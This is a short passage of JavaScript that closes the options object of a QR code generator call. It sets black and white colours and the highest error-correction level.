colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 